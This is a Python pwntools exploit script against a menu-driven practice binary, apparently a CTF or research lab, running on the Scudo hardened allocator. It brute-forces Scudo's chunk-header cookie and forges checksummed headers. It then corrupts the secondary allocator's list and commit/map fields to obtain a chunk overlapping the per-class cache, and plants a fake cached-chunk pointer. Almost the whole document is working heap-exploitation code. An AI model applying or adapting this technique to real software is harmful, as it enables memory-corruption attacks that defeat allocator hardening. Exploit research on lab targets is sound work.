#!/usr/bin/python3
from pwn import *
from utils import *
from scudocookie import bruteforce, calc_checksum

elf = context.binary = ELF("malloc-menu-linux/malloc-menu-linux")

gs = '''
source ./malloc-menu-linux/scudo-19e6d541889f.py
continue
'''

SCUDO_LIB = os.path.realpath("malloc-menu-linux/libscudo-linux-latest.so") 
env = {"LD_PRELOAD": SCUDO_LIB}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=5",
        "quarantine_size_kb=10",
        "quarantine_max_chunk_size=2048",
        "release_to_os_interval_ms=-1"
    ])

    
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, env=env)
    else:
        return process(elf.path, env=env, stdin=PTY)
   
io = start()


# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The malloc() function chooses option 1 and then 3 from the menu.
# Its arguments are "size" and "data".
ind1, add1 = malloc(io, 24)
ind2, add2 = malloc(io, 24)

info(f"address 1: {hex(add1)} address 2: {hex(add2)}")
write(io, add1, b"X"*12)
write(io, add2, b"Y"*12)

#scudo_base = get_libscudo_base(io, SCUDO_LIB)
hardware_crc32 = True

#info(f"lib-scudo base: {hex(scudo_base)}")

cookie = bruteforce_cookie(io, add2, hardware_crc32)
info(f"bruteforced cookie: {hex(cookie)}")

# mess with the chunk header at add2

new_header = 0x8100
new_header = create_header(0, 8, 1)
forged_header = forge_header(add2, cookie, new_header, hardware_crc32)

info("writing!!!!")

input("continue")


largechunk_start = add2-0x40

exploit_perclass_header = create_header(20, 18, 1)

write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header, hardware_crc32))

free(io, largechunk_start+0x10)

write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header, hardware_crc32))

free(io, largechunk_start+0x10)

write(io, add1, p64(largechunk_start))
write(io, add1+0x8, p64(largechunk_start))


perclass_add = get_perclass_base(io, SCUDO_LIB, 20)
#perclass_add = int(input("give me the perclass address: "), 16)

print(f'perclass base: 0x{perclass_add:x}')

#write(io, largechunk_start, p64(perclass_add+0x70)) #prev 
#write(io, largechunk_start+0x8, p64(perclass_add+0x70)) #next
write(io, largechunk_start, p64(perclass_add+0x10)) #prev 
write(io, largechunk_start+0x8, p64(perclass_add+0x10)) #next
write(io, largechunk_start+0x10, p64(add1)) # CommitBase
write(io, largechunk_start+0x18, p64(0x30000)) # CommitSize
write(io, largechunk_start+0x20, p64(add1)) # MapBase
write(io, largechunk_start+0x28, p64(0x30000)) #MapSize
write(io, largechunk_start+0x30, forged_header) # Forge Header


free(io, add2)

perclass_chunk = malloc(io, 2000)[1]

print(f'perclass chunk: 0x{perclass_chunk:x}')

# create perclass structure in the following perclass structure

num_cached_chunks = 1
max_cached_chunks = 2
next_cached_chunk = 0xdeadbeefdeadbeef
class_id_offset = 1

write(io, perclass_chunk+((class_id_offset-1)*0x100)+0xe0, p32((max_cached_chunks<<16) + num_cached_chunks))
write(io, perclass_chunk+((class_id_offset-1)*0x100)+0xf0, p64(next_cached_chunk))

# =============================================================================

io.interactive()
